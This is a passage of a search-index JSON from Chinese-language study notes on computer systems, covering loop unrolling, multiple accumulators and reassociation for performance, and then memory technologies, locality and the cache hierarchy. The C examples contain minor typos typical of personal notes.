\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u5185\u200b\u5faa\u73af\u200b n \u200b\u6b21\u200b\u8fed\u4ee3\u200b\u7684\u200b\u6570\u636e\u6d41\u200b\u8868\u793a\u200b. \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u7531\u200b\u4e24\u6761\u200b\u6570\u636e\u200b\u76f8\u5173\u200b\u94fe\u200b. \u200b\u7531\u4e8e\u200b\u6d6e\u70b9\u200b\u4e58\u6cd5\u200b\u5ef6\u8fdf\u200b\u4e3a\u200b 5 \u200b\u4e2a\u200b\u5468\u671f\u200b, \u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\u5ef6\u8fdf\u200b\u4e3a\u200b 1 \u200b\u4e2a\u200b\u5468\u671f\u200b, \u200b\u56e0\u6b64\u200b\u5de6\u8fb9\u200b\u7684\u200b\u94fe\u4f1a\u200b\u6210\u4e3a\u200b\u5173\u952e\u200b\u8def\u5f84\u200b.</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\u5e76\u200b\u6ca1\u6709\u200b\u8fbe\u5230\u200b\u5ef6\u8fdf\u200b\u754c\u9650\u200b 1.00 \u200b\u800c\u662f\u200b 1.27 , \u200b\u53ef\u80fd\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5176\u4ed6\u200b\u56e0\u7d20\u200b\u9650\u5236\u200b\u4e86\u200b\u6027\u80fd\u200b, \u200b\u4f8b\u5982\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u4e4b\u95f4\u200b\u4f20\u9012\u6570\u636e\u200b\u7684\u200b\u6570\u91cf\u200b. \u200b\u6570\u636e\u200b\u64cd\u4f5c\u200b\u8db3\u591f\u200b\u5feb\u200b, \u200b\u4f7f\u5f97\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\u4f9b\u5e94\u200b\u6570\u636e\u200b\u7684\u200b\u901f\u5ea6\u200b\u4e0d\u591f\u200b\u5757\u200b(\u200b\u4f8b\u5982\u200b load \u200b\u8017\u65f6\u200b\u592a\u4e45\u200b)</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#58","title":"5.8 \u200b\u5faa\u73af\u5c55\u5f00","text":"<p>k*1\u200b\u5faa\u73af\u5c55\u5f00\u200b</p> <p>\u200b\u6bcf\u4e2a\u200b\u5faa\u73af\u200b\u6267\u884c\u200b k \u200b\u6b21\u200b\u64cd\u4f5c\u200b, \u200b\u53ea\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b\u7d2f\u79ef\u200b\u53d8\u91cf\u200b.</p> C<pre><code>void combine5(vec_ptr v, data_t *dest) {\n    long i;\n    long length = vec_legnth(v);\n    long limit = length - 1\n    data_t *data = get_vec_start(v);\n    data_t acc = IDENT;\n\n    for (i = 0; i &lt; limit; i+=2) {\n        acc = (acc OP data[i]) OP data[i+1];\n    }\n\n    for (; i &lt; length; i++) {\n        acc = acc OP data[i];\n    }\n\n    *dest = acc;\n}\n</code></pre> <p></p> <p>\u200b\u8fd9\u79cd\u200b\u5faa\u73af\u5c55\u5f00\u200b\u867d\u7136\u200b\u51cf\u5c11\u200b\u4e86\u200b\u5faa\u73af\u200b\u7684\u200b\u5f00\u9500\u200b(\u200b\u6761\u4ef6\u200b\u5224\u65ad\u200b, \u200b\u5faa\u73af\u200b\u53d8\u91cf\u200b\u81ea\u589e\u200b), \u200b\u4f46\u662f\u200b\u5e76\u200b\u6ca1\u6709\u200b\u5b9e\u8d28\u200b\u6539\u53d8\u200b\u6570\u636e\u200b\u4f9d\u8d56\u200b\u7684\u200b\u5173\u7cfb\u200b, \u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u7684\u200b\u4e24\u4e2a\u200b\u64cd\u4f5c\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b.</p> <p></p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#59","title":"5.9 \u200b\u63d0\u9ad8\u200b\u5e76\u884c\u6027","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u5faa\u73af\u5c55\u5f00\u200b\u4e0d\u80fd\u200b\u5229\u7528\u200b\u53d1\u5c04\u200b\u65f6\u95f4\u200b\u4e3a\u200b 1 \u200b\u8fbe\u5230\u200b\u541e\u5410\u91cf\u200b\u754c\u9650\u200b\u7684\u200b\u6839\u672c\u539f\u56e0\u200b\u5728\u4e8e\u200b\u53ea\u200b\u4f7f\u7528\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7d2f\u79ef\u200b\u904d\u5386\u200b acc. \u200b\u5728\u200b\u6bcf\u6b21\u200b\u8ba1\u7b97\u200b, \u200b\u6211\u4eec\u200b\u90fd\u200b\u8981\u200b\u7b49\u5f85\u200b\u524d\u9762\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u7684\u200b acc \u200b\u7684\u200b\u65b0\u503c\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#591","title":"5.9.1 \u200b\u591a\u4e2a\u200b\u7d2f\u79ef\u200b\u53d8\u91cf","text":"<p>\u200b\u5bf9\u4e8e\u200b\u53ef\u200b\u7ed3\u5408\u200b\u548c\u200b\u53ef\u200b\u4ea4\u6362\u200b\u7684\u200b\u5408\u5e76\u200b\u8fd0\u7b97\u200b\u6765\u8bf4\u200b, \u200b\u6bd4\u5982\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\u6216\u200b\u4e58\u6cd5\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5c06\u200b\u4e00\u7ec4\u200b\u5408\u5e76\u200b\u8fd0\u7b97\u200b\u5206\u5272\u200b\u6210\u200b\u4e24\u4e2a\u200b\u6216\u200b\u66f4\u200b\u591a\u200b\u90e8\u5206\u200b, \u200b\u6700\u540e\u200b\u5408\u5e76\u200b\u7ed3\u679c\u200b. \u200b\u4e5f\u200b\u5c31\u662f\u200b\u4f7f\u7528\u200b\u591a\u4e2a\u200b\u7d2f\u79ef\u200b\u53d8\u91cf\u200b. \u200b\u8fd9\u79cd\u200b\u5faa\u73af\u5c55\u5f00\u200b\u65b9\u6cd5\u200b\u79f0\u4e3a\u200b k*k\u200b\u5faa\u73af\u5c55\u5f00\u200b.</p> C<pre><code>void combine6(vec_ptr v, data_t *dest) {\n    long i;\n    long length = vec_legnth(v);\n    long limit = length - 1\n    data_t *data = get_vec_start(v);\n    data_t acc0 = IDENT;\n    data_t acc1 = IDENT;\n\n    for (i = 0; i &lt; limit; i+=2) {\n        acc0 = acc0 OP data[i];\n        acc1 = acc1 OP data[i+1];\n    }\n\n    for (; i &lt; length; i++) {\n        acc0 = acc0 OP data[i];\n    }\n\n    *dest = acc0 OP acc1;\n}\n</code></pre> <p></p> <p>\u200b\u901a\u8fc7\u200b 2*2 \u200b\u5faa\u73af\u5c55\u5f00\u200b, \u200b\u6211\u4eec\u200b\u5c06\u200b\u4e00\u6761\u200b\u5173\u952e\u200b\u8def\u5f84\u200b\u5206\u6210\u200b\u4e86\u200b\u4e24\u6761\u200b\u5173\u952e\u200b\u8def\u5f84\u200b, \u200b\u6bcf\u6761\u200b\u8def\u5f84\u200b\u4e0a\u200b\u53ea\u6709\u200b n/2 \u200b\u4e2a\u200b\u64cd\u4f5c\u200b, \u200b\u56e0\u6b64\u200b CPE \u200b\u5927\u7ea6\u200b\u662f\u200b\u539f\u6765\u200b\u7684\u200b\u4e00\u822c\u200b.</p> <p>\u200b\u5f53\u200b k \u200b\u8db3\u591f\u200b\u5927\u65f6\u200b, \u200b\u51e0\u4e4e\u200b\u6240\u6709\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u90fd\u200b\u80fd\u200b\u8fbe\u5230\u200b\u541e\u5410\u91cf\u200b\u754c\u9650\u200b. \u200b\u867d\u7136\u200b\u6d6e\u70b9\u200b\u4e58\u200b\u66f4\u200b\u8017\u65f6\u200b, \u200b\u4f46\u662f\u200b\u5b83\u200b\u7684\u200b\u541e\u5410\u91cf\u200b\u754c\u9650\u200b\u662f\u200b\u6d6e\u70b9\u200b\u52a0\u200b\u7684\u200b 1/2. \u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6d6e\u70b9\u200b\u4e58\u6709\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u529f\u80fd\u200b\u5355\u5143\u200b.</p> <p>\u200b\u4e3a\u4e86\u200b\u8fbe\u5230\u200b\u541e\u5410\u91cf\u200b\u754c\u9650\u200b, \u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u80fd\u591f\u200b\u6267\u884c\u200b\u8be5\u200b\u64cd\u4f5c\u200b\u7684\u200b\u6240\u6709\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u7684\u200b\u6d41\u6c34\u7ebf\u200b\u90fd\u200b\u662f\u200b\u6ee1\u200b\u7684\u200b, \u200b\u4e00\u4e2a\u200b\u5ef6\u8fdf\u200b\u4e3a\u200b L, \u200b\u5bb9\u91cf\u200b\u4e3a\u200b C \u200b\u7684\u200b\u5b8c\u5168\u200b\u6d41\u6c34\u7ebf\u200b\u5316\u200b\u7684\u200b\u64cd\u4f5c\u200b, \u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u81f3\u5c11\u200b\u8981\u200b\u540c\u65f6\u200b\u6267\u884c\u200b C*L \u200b\u6761\u8be5\u200b\u64cd\u4f5c\u200b\u624d\u80fd\u200b\u628a\u200b\u6d41\u6c34\u7ebf\u200b\u586b\u6ee1\u200b. \u200b\u56e0\u6b64\u200b\u8fd9\u200b\u5c31\u200b\u8981\u6c42\u200b k&gt;=C*L.</p> <p>\u200b\u7531\u4e8e\u200b\u6d6e\u70b9\u200b\u52a0\u4e58\u200b\u662f\u200b\u4e0d\u53ef\u200b\u7ed3\u5408\u200b\u7684\u200b, \u200b\u6240\u4ee5\u200b\u5728\u200b\u4f7f\u7528\u200b\u8fd9\u79cd\u200b\u5c55\u5f00\u200b\u7684\u200b\u65f6\u5019\u200b\u8981\u200b\u683c\u5916\u200b\u5c0f\u5fc3\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#592","title":"5.9.2 \u200b\u91cd\u65b0\u200b\u7ed3\u5408\u200b\u53d8\u6362","text":"<p>k*1a\u200b\u5faa\u73af\u5c55\u5f00\u200b</p> C<pre><code>void combine7(vec_ptr v, data_t *dest) {\n    long i;\n    long length = vec_legnth(v);\n    long limit = length - 1\n    data_t *data = get_vec_start(v);\n    data_t acc = IDENT;\n\n    for (i = 0; i &lt; limit; i+=2) {\n        acc = acc OP (data[i] OP data[i+1]);\n    }\n\n    for (; i &lt; length; i++) {\n        acc = acc OP data[i];\n    }\n\n    *dest = acc;\n}\n</code></pre> <p>\u200b\u5728\u200b combine7 \u200b\u4e2d\u200b, \u200b\u6211\u4eec\u200b\u5c06\u200b\u62ec\u53f7\u200b\u653e\u5728\u200b\u4e86\u200b\u540e\u9762\u200b. \u200b\u8fd9\u200b\u5c31\u662f\u200b\u91cd\u65b0\u200b\u7ed3\u5408\u200b\u53d8\u6362\u200b.</p> <p></p> <p>\u200b\u56e0\u4e3a\u200b\u5faa\u73af\u200b\u53d8\u91cf\u200b acc \u200b\u5728\u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u53ea\u200b\u6267\u884c\u200b\u4e86\u200b\u4e00\u6b21\u200b\u4e58\u6cd5\u200b, \u200b\u56e0\u6b64\u200b\u5173\u952e\u200b\u8def\u5f84\u200b\u4e0a\u200b\u53ea\u6709\u200b n/2 \u200b\u6b21\u200b\u64cd\u4f5c\u200b.</p> <p></p> <p>CPE \u200b\u5206\u522b\u200b\u662f\u200b 5, 5/3*2, 5/3, 5/3, 5/3*2.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#510","title":"5.10 \u200b\u4e00\u4e9b\u200b\u9650\u5236\u200b\u56e0\u7d20","text":""},{"location":"notes/ICS/Chapter%2005%20Optimization/#5101","title":"5.10.1 \u200b\u5bc4\u5b58\u5668\u200b\u6ea2\u51fa","text":"<p>\u200b\u4e00\u65e6\u200b\u5faa\u73af\u200b\u53d8\u91cf\u200b\u7684\u200b\u6570\u91cf\u200b\u8d85\u8fc7\u200b\u4e86\u200b\u53ef\u7528\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u6570\u91cf\u200b, \u200b\u7a0b\u5e8f\u200b\u5c31\u200b\u5fc5\u987b\u200b\u5728\u200b\u6808\u200b\u4e0a\u200b\u5206\u914d\u200b\u4e00\u4e9b\u200b\u53d8\u91cf\u200b, \u200b\u56e0\u6b64\u200b\u5c55\u5f00\u200b\u6b21\u6570\u200b\u8fc7\u9ad8\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u66f4\u597d\u200b\u7684\u200b\u7ed3\u679c\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#5102","title":"5.10.2 \u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u548c\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u5904\u7f5a","text":"<p>1. \u200b\u4e0d\u8981\u200b\u8fc7\u5206\u200b\u5173\u5fc3\u200b\u53ef\u200b\u9884\u6d4b\u200b\u7684\u200b\u5206\u652f\u200b</p> <p>combine3 \u200b\u4e2d\u200b\u7684\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u6211\u4eec\u200b\u603b\u662f\u200b\u9884\u6d4b\u200b\u68c0\u6d4b\u200b\u6210\u529f\u200b, \u200b\u56e0\u6b64\u200b\u5bf9\u200b\u6211\u4eec\u200b\u7684\u200b\u6027\u80fd\u200b\u6ca1\u6709\u200b\u4ec0\u4e48\u200b\u5f71\u54cd\u200b.</p> <p>2. \u200b\u4e66\u5199\u200b\u9002\u5408\u200b\u7528\u200b\u6761\u4ef6\u200b\u4f20\u9001\u200b\u5b9e\u73b0\u200b\u7684\u200b\u4ee3\u7801\u200b</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#511","title":"5.11 \u200b\u7406\u89e3\u200b\u5185\u5b58\u200b\u6027\u80fd","text":"<p>\u200b\u8fd9\u91cc\u200b, \u200b\u6211\u4eec\u200b\u5047\u8bbe\u200b\u6570\u636e\u200b\u90fd\u200b\u5b58\u653e\u200b\u5728\u200b\u9ad8\u901f\u7f13\u5b58\u200b\u4e2d\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#5121","title":"5.12.1 \u200b\u52a0\u8f7d\u200b\u7684\u200b\u6027\u80fd","text":"<p>\u200b\u5bf9\u4e8e\u200b\u4e24\u4e2a\u200b\u52a0\u8f7d\u200b\u5355\u5143\u200b, \u200b\u6bcf\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u542f\u52a8\u200b\u4e00\u6761\u200b\u52a0\u8f7d\u200b\u64cd\u4f5c\u200b, \u200b\u56e0\u6b64\u200b CPE \u200b\u4e0d\u200b\u53ef\u80fd\u200b\u5c0f\u4e8e\u200b 0.5.</p> <p>\u200b\u5229\u7528\u200b\u94fe\u8868\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u52a0\u8f7d\u200b\u64cd\u4f5c\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u5927\u7ea6\u200b\u662f\u200b 4.00 CPE</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#5122","title":"5.12.2 \u200b\u5b58\u50a8\u200b\u7684\u200b\u6027\u80fd","text":"<p>\u200b\u5927\u591a\u6570\u200b\u60c5\u51b5\u200b, \u200b\u5b58\u50a8\u200b\u64cd\u4f5c\u200b\u80fd\u591f\u200b\u5728\u200b\u5b8c\u5168\u200b\u6d41\u6c34\u7ebf\u200b\u7684\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\u5de5\u4f5c\u200b, \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u5f00\u59cb\u200b\u4e00\u6761\u200b\u65b0\u200b\u7684\u200b\u5b58\u50a8\u200b.</p> <p>\u200b\u5b58\u50a8\u200b\u64cd\u4f5c\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u4efb\u4f55\u200b\u5bc4\u5b58\u5668\u200b\u503c\u200b, \u200b\u53ea\u6709\u200b\u52a0\u8f7d\u200b\u64cd\u4f5c\u200b\u4f1a\u53d7\u200b\u5176\u200b\u5f71\u54cd\u200b, \u200b\u56e0\u6b64\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u751f\u200b\u5199\u200b/\u200b\u8bfb\u200b\u76f8\u5173\u200b</p> <p>\u200b\u8ddf\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u8bb2\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u547d\u540d\u200b\u7c7b\u4f3c\u200b, \u200b\u5b58\u50a8\u200b\u64cd\u4f5c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5b58\u50a8\u200b\u7f13\u51b2\u533a\u200b, \u200b\u5305\u542b\u200b\u5df2\u7ecf\u200b\u53d1\u5c04\u200b\u5230\u200b\u5b58\u50a8\u5355\u5143\u200b\u800c\u200b\u6ca1\u6709\u200b\u5b8c\u6210\u200b\u7684\u200b\u5b58\u50a8\u200b\u64cd\u4f5c\u200b\u7684\u200b\u5730\u5740\u200b\u548c\u200b\u6570\u636e\u200b. \u200b\u4e00\u4e2a\u200b\u52a0\u8f7d\u200b\u64cd\u4f5c\u200b\u53d1\u751f\u200b\u65f6\u200b, \u200b\u5fc5\u987b\u200b\u5148\u200b\u68c0\u67e5\u200b\u5b58\u50a8\u200b\u7f13\u51b2\u533a\u200b\u7684\u200b\u6761\u76ee\u200b, \u200b\u770b\u200b\u6709\u6ca1\u6709\u200b\u5730\u5740\u200b\u76f8\u5339\u914d\u200b, \u200b\u5982\u679c\u200b\u6709\u200b\u5c31\u200b\u53d6\u51fa\u200b\u76f8\u5e94\u200b\u7684\u200b\u6570\u636e\u200b\u6761\u76ee\u200b\u4f5c\u4e3a\u200b\u7ed3\u679c\u200b.</p> <p></p> <p></p>"},{"location":"notes/ICS/Chapter%2006%20Cache/","title":"Chapter 06 Cache","text":""},{"location":"notes/ICS/Chapter%2006%20Cache/#61","title":"6.1 \u200b\u5b58\u50a8\u6280\u672f","text":""},{"location":"notes/ICS/Chapter%2006%20Cache/#611-ram","title":"6.1.1 \u200b\u968f\u673a\u200b\u8bbf\u95ee\u200b\u5b58\u50a8\u5668\u200b (RAM)","text":"<ul> <li>\u200b\u9759\u6001\u200b RAM: SRAM \u200b\u5e38\u7528\u200b\u6765\u200b\u5236\u4f5c\u200b\u9ad8\u901f\u7f13\u5b58\u200b, \u200b\u901f\u5ea6\u200b\u5feb\u200b, \u200b\u6301\u7eed\u200b</li> <li>\u200b\u52a8\u6001\u200b RAM: DRAM \u200b\u5e38\u7528\u200b\u6765\u200b\u5236\u4f5c\u200b\u4e3b\u5b58\u200b, \u200b\u5e27\u200b\u7f13\u51b2\u533a\u200b, \u200b\u901f\u5ea6\u200b\u8f83\u6162\u200b, \u200b\u4e0d\u200b\u6301\u7eed\u200b, \u200b\u9700\u8981\u200b\u5237\u65b0\u200b</li> <li>\u200b\u4f20\u7edf\u200b\u7684\u200b DRAM:<ul> <li>DRAM\u200b\u82af\u7247\u200b\u4e2d\u6709\u200b d \u200b\u4e2a\u200b\u8d85\u200b\u5355\u5143\u200b, \u200b\u6bcf\u4e2a\u200b\u8d85\u200b\u5355\u5143\u200b\u7531\u200b w \u200b\u4e2a\u200b DRAM \u200b\u5355\u5143\u200b\u7ec4\u6210\u200b, \u200b\u53ef\u200b\u5b58\u50a8\u200b dw \u200b\u4f4d\u200b\u4fe1\u606f\u200b</li> <li>\u200b\u901a\u8fc7\u200b addr \u200b\u5f15\u811a\u200b\u5148\u200b\u4f20\u9001\u200b\u884c\u200b, \u200b\u518d\u200b\u4f20\u9001\u200b\u5217\u200b, \u200b\u901a\u8fc7\u200b data \u200b\u5f15\u811a\u200b\u4f20\u9001\u6570\u636e\u200b</li> </ul> </li> <li>\u200b\u5185\u5b58\u6a21\u5757\u200b: \u200b\u6709\u200b\u591a\u4e2a\u200b DRAM \u200b\u82af\u7247\u200b\u7ec4\u6210\u200b, \u200b\u6bcf\u4e2a\u200b\u50a8\u5b58\u200b\u4e3b\u5b58\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b.\\</li> <li>\u200b\u589e\u5f3a\u200b\u7684\u200b DRAM:<ul> <li>\u200b\u5feb\u200b\u9875\u6a21\u5f0f\u200b DRAM: \u200b\u5bf9\u200b\u540c\u4e00\u200b\u884c\u200b\u8fde\u7eed\u200b\u7684\u200b\u8bbf\u95ee\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5229\u7528\u200b\u884c\u200b\u7f13\u51b2\u533a\u200b</li> <li>...</li> </ul> </li> <li>\u200b\u975e\u6613\u200b\u5931\u6027\u200b\u5b58\u50a8\u5668\u200b: \u200b\u65ad\u7535\u200b\u540e\u200b\u4ecd\u7136\u200b\u4fdd\u5b58\u4fe1\u606f\u200b<ul> <li>PROM: \u200b\u53ea\u80fd\u200b\u7f16\u7a0b\u200b\u4e00\u6b21\u200b</li> <li>\u200b\u53ef\u200b\u64e6\u5199\u200b\u53ef\u7f16\u7a0b\u200b ROM: \u200b\u901a\u8fc7\u200b\u5149\u200b\u7f16\u7a0b\u200b, 1000\u200b\u6b21\u200b</li> <li>\u200b\u7535\u5b50\u200b\u53ef\u200b\u64e6\u9664\u200b PROM: \u200b\u53ef\u200b\u5728\u200b\u7535\u8def\u200b\u5361\u4e0a\u200b\u76f4\u63a5\u200b\u53d8\u6210\u200b, 10^5 \u200b\u6b21\u200b</li> <li>\u200b\u95ea\u5b58\u200b</li> </ul> </li> <li>\u200b\u8fde\u63a5\u200b\u7cfb\u7edf\u603b\u7ebf\u200b\u548c\u200b\u5185\u5b58\u200b\u603b\u7ebf\u200b: I/O\u200b\u6865\u200b</li> </ul>"},{"location":"notes/ICS/Chapter%2006%20Cache/#612","title":"6.1.2 \u200b\u78c1\u76d8","text":"<p>\u200b\u7531\u200b\u76d8\u7247\u200b\u6784\u6210\u200b, \u200b\u6bcf\u4e2a\u200b\u76d8\u7247\u200b\u6709\u200b\u4e24\u9762\u200b(\u200b\u79f0\u4e3a\u200b\u8868\u9762\u200b), \u200b\u4e2d\u592e\u200b\u662f\u200b\u4e3b\u8f74\u200b.</p> <p>\u200b\u6bcf\u4e2a\u200b\u8868\u9762\u200b\u7531\u200b\u4e00\u7ec4\u200b\u78c1\u9053\u200b\u7684\u200b\u540c\u5fc3\u5706\u200b\u7ec4\u6210\u200b, \u200b\u6bcf\u4e2a\u200b\u78c1\u9053\u200b\u88ab\u200b\u5212\u5206\u200b\u4e3a\u200b\u4e00\u7ec4\u200b\u6247\u533a\u200b, \u200b\u6247\u533a\u200b\u4e4b\u95f4\u200b\u6709\u200b\u4e00\u4e9b\u200b\u95f4\u9699\u200b.</p> <p>\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b = \u200b\u5bfb\u200b\u9053\u200b\u65f6\u95f4\u200b + \u200b\u5e73\u5747\u200b\u65cb\u8f6c\u200b\u65f6\u95f4\u200b(1/2\u200b\u6700\u5927\u200b\u65cb\u8f6c\u200b\u65f6\u95f4\u200b) + \u200b\u8bfb\u53d6\u200b\u4e00\u4e2a\u200b\u6247\u533a\u200b\u7684\u200b\u65f6\u95f4\u200b(\u200b\u6700\u5927\u200b\u65cb\u8f6c\u200b\u65f6\u95f4\u200b/\u200b\u5e73\u5747\u200b\u6247\u533a\u200b\u6570\u200b)</p> <p>\u200b\u903b\u8f91\u200b\u5757\u200b: \u200b\u7ed9\u200b\u6bcf\u4e2a\u200b\u6247\u533a\u200b\u7684\u200b\u7f16\u53f7\u200b</p> <p>\u200b\u4e0d\u200b\u9700\u8981\u200b CPU \u200b\u5e72\u6d89\u200b\u800c\u200b\u53ef\u4ee5\u200b\u81ea\u5df1\u200b\u6267\u884c\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b\u603b\u7ebf\u200b\u4e8b\u7269\u200b\u79f0\u4e3a\u200b DMA (\u200b\u76f4\u63a5\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b), \u200b\u5728\u200b\u4f20\u9001\u200b\u7ed3\u675f\u200b\u540e\u200b\u4e00\u822c\u200b\u4f1a\u200b\u53d1\u9001\u200b\u4e00\u4e2a\u200b\u4e2d\u65ad\u200b\u4fe1\u53f7\u200b\u901a\u77e5\u200b CPU.</p>"},{"location":"notes/ICS/Chapter%2006%20Cache/#613","title":"6.1.3 \u200b\u56fa\u6001\u200b\u786c\u76d8","text":"<p>\u200b\u8bfb\u200b SSD \u200b\u6bd4\u4e9b\u200b\u8981\u200b\u5feb\u200b. \u200b\u53ea\u6709\u200b\u5728\u200b\u4e00\u9875\u200b\u6240\u5c5e\u200b\u7684\u200b\u5757\u200b\u6574\u4e2a\u200b\u88ab\u200b\u64e6\u9664\u200b\u540e\u200b, \u200b\u624d\u80fd\u200b\u5199\u200b\u8fd9\u200b\u4e00\u9875\u200b.</p> <p>\u200b\u968f\u673a\u200b\u5199\u200b\u5f88\u6162\u200b: - \u200b\u64e6\u9664\u200b\u5f88\u200b\u8017\u65f6\u200b - \u200b\u5982\u679c\u200b\u8bd5\u56fe\u200b\u4fee\u6539\u200b\u4e00\u4e2a\u200b\u5df2\u7ecf\u200b\u6709\u200b\u6570\u636e\u200b\u7684\u200b\u9875\u200b, \u200b\u8fd9\u4e2a\u200b\u5757\u200b\u4e2d\u200b\u7684\u200b\u6240\u6709\u200b\u6709\u7528\u200b\u6570\u636e\u200b\u7684\u200b\u9875\u200b\u90fd\u200b\u5fc5\u987b\u200b\u590d\u5236\u5230\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u64e6\u9664\u200b\u8fc7\u200b\u7684\u200b\u5757\u200b.</p>"},{"location":"notes/ICS/Chapter%2006%20Cache/#62","title":"6.2 \u200b\u5c40\u90e8\u6027","text":"<ul> <li>\u200b\u65f6\u95f4\u200b\u5c40\u90e8\u6027\u200b: \u200b\u88ab\u200b\u5f15\u7528\u200b\u8fc7\u200b\u4e00\u6b21\u200b\u7684\u200b\u5185\u5b58\u200b\u4f4d\u7f6e\u200b\u5728\u200b\u4e0d\u8fdc\u200b\u7684\u200b\u5c06\u6765\u200b\u518d\u200b\u88ab\u200b\u591a\u6b21\u200b\u5f15\u7528\u200b</li> <li>\u200b\u7a7a\u95f4\u200b\u5c40\u90e8\u6027\u200b: \u200b\u4e00\u4e2a\u200b\u5185\u5b58\u200b\u4f4d\u7f6e\u200b\u88ab\u200b\u5f15\u7528\u200b\u4e86\u200b, \u200b\u5b83\u200b\u9644\u8fd1\u200b\u7684\u200b\u5185\u5b58\u200b\u4f4d\u7f6e\u200b\u5728\u200b\u4e0d\u8fdc\u200b\u7684\u200b\u5c06\u6765\u200b\u88ab\u200b\u5f15\u7528\u200b</li> </ul>"},{"location":"notes/ICS/Chapter%2006%20Cache/#63","title":"6.3 \u200b\u5b58\u50a8\u5668\u200b\u5c42\u6b21\u7ed3\u6784","text":""},{"location":"notes/ICS/Chapter%2006%20Cache/#631","title":"6.3.1 \u200b\u5b58\u50a8\u5668\u200b\u5c42\u6b21\u7ed3\u6784\u200b\u4e2d\u200b\u7684\u200b\u7f13\u5b58","text":"<p>\u200b\u4e2d\u5fc3\u601d\u60f3\u200b: \u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200bk, \u200b\u4f4d\u4e8e\u200b k \u200b\u5c42\u200b\u7684\u200b\u66f4\u200b\u5feb\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u4f5c\u4e3a\u200b\u4f4d\u4e8e\u200b k+1 \u200b\u5c42\u200b\u7684\u200b\u66f4\u200b\u5927\u200b\u66f4\u6162\u200b\u7684\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u7684\u200b\u7f13\u5b58\u200b.</p> <ul> <li>\u200b\u7f13\u5b58\u200b\u547d\u4e2d\u200b: \u200b\u9700\u8981\u200b k+1 \u200b\u5c42\u200b\u7684\u200b\u6570\u636e\u200b\u65f6\u200b\u521a\u597d\u200b\u5728\u200b\u7b2c\u200b k \u200b\u5c42\u200b\u627e\u5230\u200b</li> <li>\u200b\u7f13\u5b58\u200b\u4e0d\u200b\u547d\u4e2d\u200b: \u200b\u7b2c\u200b k \u200b\u5c42\u200b\u9700\u8981\u200b\u4ece\u200b \u200b\u7b2c\u200b k+1 \u200b\u5c42\u200b\u53d6\u51fa\u200b\u5305\u542b\u200b d \u200b\u7684\u200b\u5757\u200b, \u200b\u5982\u679c\u200b\u7b2c\u200b k \u200b\u5c42\u200b\u7684\u200b\u7f13\u5b58\u200b\u6ee1\u200b\u4e86\u200b, \u200b\u9700\u8981\u200b\u9a71\u9010\u200b\u73b0\u5b58\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5757\u200b. (LRU\u200b\u9a71\u9010\u200b\u7b56\u7565\u200b, \u200b\u66ff\u6362\u200b\u6389\u200b\u6700\u540e\u200b\u88ab\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u95f4\u200b\u8ddd\u200b\u73b0\u5728\u200b\u6700\u8fdc\u200b\u7684\u200b\u5757\u200b)</li> <li>\u200b\u51b7\u200b\u4e0d\u200b\u547d\u4e2d\u200b: \u200b\u7531\u4e8e\u200b\u7f13\u5b58\u200b\u4e3a\u7a7a\u200b\u5bfc\u81f4\u200b</li> 